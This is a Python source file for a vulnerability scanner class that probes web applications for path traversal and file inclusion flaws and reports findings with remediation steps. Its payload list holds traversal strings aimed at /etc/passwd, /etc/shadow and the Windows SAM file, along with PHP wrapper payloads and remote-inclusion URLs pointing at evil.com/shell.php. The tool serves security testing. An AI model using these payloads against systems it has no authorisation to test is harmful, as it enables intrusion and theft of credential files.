"""Path Traversal and File Inclusion vulnerability scanner."""

import re
import requests
import hashlib
import os
import time
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode

import logging
logger = logging.getLogger(__name__)


class PathTraversalScanner(BaseScanner):
    """Scanner for Path Traversal and File Inclusion vulnerabilities."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.DEFENSIVE, exhaustive: bool = False):
        """
        Initialize Path Traversal scanner.
        
        Args:
            enabled: Whether scanner is enabled
            scan_mode: Scan mode (defensive or offensive)
            exhaustive: If True, test all payloads/parameters (slower but more thorough).
                       If False, use optimized set (faster, standard mode).
        """
        super().__init__(
            name="path_traversal",
            command=None,  # No external command needed
            enabled=enabled,
            scan_mode=scan_mode
        )
        self.exhaustive = exhaustive
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.timeout = 10
        
        # Generate unique test marker
        self.test_marker = hashlib.md5(f"path_traversal_test_{os.urandom(16).hex()}".encode()).hexdigest()[:8]
        
        # Path traversal payloads
        self.traversal_payloads = [
            # Basic path traversal
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            
            # Encoded variations
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            
            # Double encoding
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            
            # Null byte injection
            '../../../etc/passwd%00',
            '../../../etc/passwd\x00',
            
            # Windows variations
            '..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '..%5c..%5c..%5cwindows%5cwin.ini',
            
            # PHP wrappers (for LFI/RFI)
            'php://filter/read=string.rot13/resource=../../../etc/passwd',
            'php://filter/convert.base64-encode/resource=../../../etc/passwd',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',  # <?php phpinfo(); ?>
            'expect://id',
            'file:///etc/passwd',
            
            # Remote file inclusion (RFI)
            'http://evil.com/shell.php',
            'https://evil.com/shell.php',
            'ftp://evil.com/shell.php',
        ]
        
        # Files to test for disclosure
        self.test_files = {
            'linux': [
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/etc/group',
                '/proc/version',
                '/proc/self/environ',
                '/etc/issue',
                '/etc/motd',
            ],
            'windows': [
                'C:\\windows\\win.ini',
                'C:\\windows\\system32\\drivers\\etc\\hosts',
                'C:\\windows\\system.ini',
                'C:\\boot.ini',
            ],
            'web': [
                '/etc/passwd',
                '/proc/self/environ',
                '/var/www/html/index.php',
                '/var/log/apache2/access.log',
                '/var/log/nginx/access.log',
            ],
        }
    
    def is_available(self) -> bool:
        """Path traversal scanner is always available."""
        return True
    
    def scan(self, target: ScanTarget) -> List[Finding]:
        """Run path traversal and file inclusion tests."""
        if self.scan_mode == ScanMode.DEFENSIVE:
            return []  # Only run in offensive mode
        
        findings = []
        
        # Test URL parameters
        findings.extend(self._test_url_parameters(target.url))
        
        # Test POST parameters
        findings.extend(self._test_post_parameters(target.url))
        
        # Test common file inclusion endpoints
        findings.extend(self._test_file_inclusion_endpoints(target.url))
        
        return findings
    
    def _test_url_parameters(self, url: str) -> List[Finding]:
        """Test URL parameters for path traversal."""
        findings = []
        
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Common file inclusion parameter names
            file_params = ['file', 'page', 'path', 'include', 'doc', 'document', 
                          'folder', 'path', 'style', 'pdf', 'template', 'view',
                          'content', 'document', 'doc', 'filename', 'pathinfo']
            
            # Test existing parameters that look file-related
            for param in params.keys():
                if any(keyword in param.lower() for keyword in ['file', 'path', 'page', 'include', 'doc', 'template']):
                    findings.extend(self._test_parameter(url, param, 'GET'))
            
            # Also test common parameter names if not present
            # In exhaustive mode, test all parameters; otherwise limit to top 8
            params_to_test = file_params if self.exhaustive else file_params[:8]
            for param in params_to_test:
                if param not in params:
                    findings.extend(self._test_parameter(url, param, 'GET'))
        except Exception as e:
            logger.debug(f"Error testing URL parameters: {e}")
        
        return findings
    
    def _test_post_parameters(self, url: str) -> List[Finding]:
        """Test POST parameters for path traversal."""
        findings = []
        
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                # Look for form inputs
                form_inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
                
                # Test file-related parameters
                file_params = ['file', 'path', 'include', 'template', 'view']
                for input_name in form_inputs:
                    if any(keyword in input_name.lower() for keyword in file_params):
                        findings.extend(self._test_parameter(url, input_name, 'POST'))
        except Exception as e:
            logger.debug(f"Error testing POST parameters: {e}")
        
        return findings
    
    def _test_file_inclusion_endpoints(self, url: str) -> List[Finding]:
        """Test common file inclusion endpoints."""
        findings = []
        
        # In exhaustive mode, test all endpoints; otherwise limit to most common
        if self.exhaustive:
            common_endpoints = [
                '/include.php',
                '/include',
                '/view.php',
                '/view',
                '/file.php',
                '/file',
                '/page.php',
                '/page',
                '/template.php',
                '/template',
                '/load.php',
                '/load',
            ]
        else:
            # Standard mode: Limit to most common endpoints to reduce scan time
            common_endpoints = [
                '/include.php',
                '/view.php',
                '/file.php',
                '/page.php',
                '/template.php',
                '/load.php',
            ]
        
        for endpoint in common_endpoints:
            test_url = urljoin(url, endpoint)
            try:
                # Test with file parameter
                findings.extend(self._test_parameter(test_url, 'file', 'GET'))
            except:
                continue
        
        return findings
    
    def _test_parameter(self, url: str, param_name: str, method: str = 'GET') -> List[Finding]:
        """Test a parameter for path traversal vulnerabilities."""
        findings = []
        
        # In exhaustive mode, test all payloads; otherwise limit to most effective ones
        if self.exhaustive:
            payloads_to_test = self.traversal_payloads  # Test all 22+ payloads
        else:
            # Standard mode: Limit to top 12 most effective payloads to reduce scan time
            max_payloads = 12
            payloads_to_test = self.traversal_payloads[:max_payloads]
        
        # Test each payload
        for payload in payloads_to_test:
            try:
                if method == 'GET':
                    # Build URL with payload
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urlencode(params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    
                    response = self.session.get(test_url, timeout=10)
                else:
                    # POST with payload
                    data = {param_name: payload}
                    response = self.session.post(url, data=data, timeout=10)
                
                response_text = response.text
                
                # Check for file disclosure indicators
                is_vulnerable = False
                exploitation_details = {}
                disclosed_file = None
                
                # Check for /etc/passwd content
                if '/etc/passwd' in payload or 'passwd' in payload:
                    if 'root:' in response_text and '/bin/' in response_text:
                        is_vulnerable = True
                        disclosed_file = '/etc/passwd'
                        exploitation_details['file_disclosed'] = '/etc/passwd'
                        exploitation_details['content_type'] = 'system_file'
                
                # Check for Windows files
                elif 'win.ini' in payload.lower():
                    if '[fonts]' in response_text or '[extensions]' in response_text:
                        is_vulnerable = True
                        disclosed_file = 'C:\\windows\\win.ini'
                        exploitation_details['file_disclosed'] = 'C:\\windows\\win.ini'
                        exploitation_details['content_type'] = 'system_file'
                
                # Check for PHP wrapper execution
                elif 'php://' in payload or 'data://' in payload:
                    if 'PHP Version' in response_text or 'phpinfo()' in response_text:
                        is_vulnerable = True
                        disclosed_file = 'PHP wrapper'
                        exploitation_details['file_disclosed'] = 'PHP wrapper execution'
                        exploitation_details['content_type'] = 'code_execution'
                        exploitation_details['rce_possible'] = True
                
                # Check for remote file inclusion
                elif payload.startswith('http://') or payload.startswith('https://'):
                    # RFI test - check if external content is included
                    if response.status_code == 200 and len(response_text) > 100:
                        # Could be RFI, but hard to confirm without control
                        # Skip for now to avoid false positives
                        pass
                
                # Check for other system files
                else:
                    # Look for common file content patterns
                    if 'root:' in response_text or '[boot loader]' in response_text:
                        is_vulnerable = True
                        disclosed_file = 'system_file'
                        exploitation_details['file_disclosed'] = 'system_file'
                        exploitation_details['content_type'] = 'system_file'
                
                if is_vulnerable:
                    # Convert exploitation_details dict to string
                    if exploitation_details:
                        details_parts = []
                        if 'file_disclosed' in exploitation_details:
                            details_parts.append(f"File disclosed: {exploitation_details['file_disclosed']}")
                        if 'content_type' in exploitation_details:
                            details_parts.append(f"Content type: {exploitation_details['content_type']}")
                        if exploitation_details.get('rce_possible'):
                            details_parts.append("Remote code execution possible")
                        exploitation_details_str = "; ".join(details_parts)
                    else:
                        exploitation_details_str = f"Path traversal vulnerability confirmed. File accessed: {disclosed_file}"
                    
                    # Determine severity
                    if exploitation_details.get('rce_possible'):
                        severity = FindingSeverity.CRITICAL  # RCE = CRITICAL
                    elif disclosed_file and 'passwd' in disclosed_file:
                        severity = FindingSeverity.HIGH  # System file disclosure = HIGH
                    else:
                        severity = FindingSeverity.MEDIUM
                    
                    # Found vulnerability - stop testing more payloads for this parameter
                    # Small delay to avoid rate limiting
                    time.sleep(0.1)
                    findings.append(Finding(
                        title=f"Path Traversal / File Inclusion Vulnerability in {param_name} Parameter",
                        description=f"Path traversal vulnerability detected in the '{param_name}' parameter ({method}). "
                                  f"The application allows reading arbitrary files from the server filesystem. "
                                  f"Disclosed file: {disclosed_file or 'unknown'}. "
                                  f"{'Remote code execution may be possible via PHP wrappers.' if exploitation_details.get('rce_possible') else ''}",
                        severity=severity,
                        category=FindingCategory.EXPLOITATION,
                        exploitation_details=exploitation_details_str,
                        source_scanner="path_traversal",
                        source_id=f"path_traversal_{param_name}_{method}",
                        url=url if method == 'GET' else f"{url} (POST)",
                        remediation=f"Sanitize and validate all user input in the '{param_name}' parameter. "
                                   f"1. Use whitelist of allowed file paths "
                                   f"2. Remove path traversal sequences (../, ..\\) "
                                   f"3. Use basename() to get only filename "
                                   f"4. Store files outside web root "
                                   f"5. Disable dangerous PHP wrappers (php://, data://, expect://) "
                                   f"6. Use absolute paths with validation",
                        metadata={
                            "parameter": param_name,
                            "method": method,
                            "payload": payload,
                            "disclosed_file": disclosed_file,
                            "exploitation_details": exploitation_details,
                            "vulnerable": True,
                        },
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://portswigger.net/web-security/file-path-traversal",
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                        ],
                    ))
                    break  # Found vulnerability, no need to test more payloads
                
                # Small delay to avoid rate limiting
                # In exhaustive mode, use longer delay (0.2s) for more thorough testing
                # In standard mode, use shorter delay (0.1s) for faster scans
                delay = 0.2 if self.exhaustive else 0.1
                time.sleep(delay)
                
            except Exception as e:
                logger.debug(f"Error testing payload {payload} on {param_name}: {e}")
                continue
        
        return findings

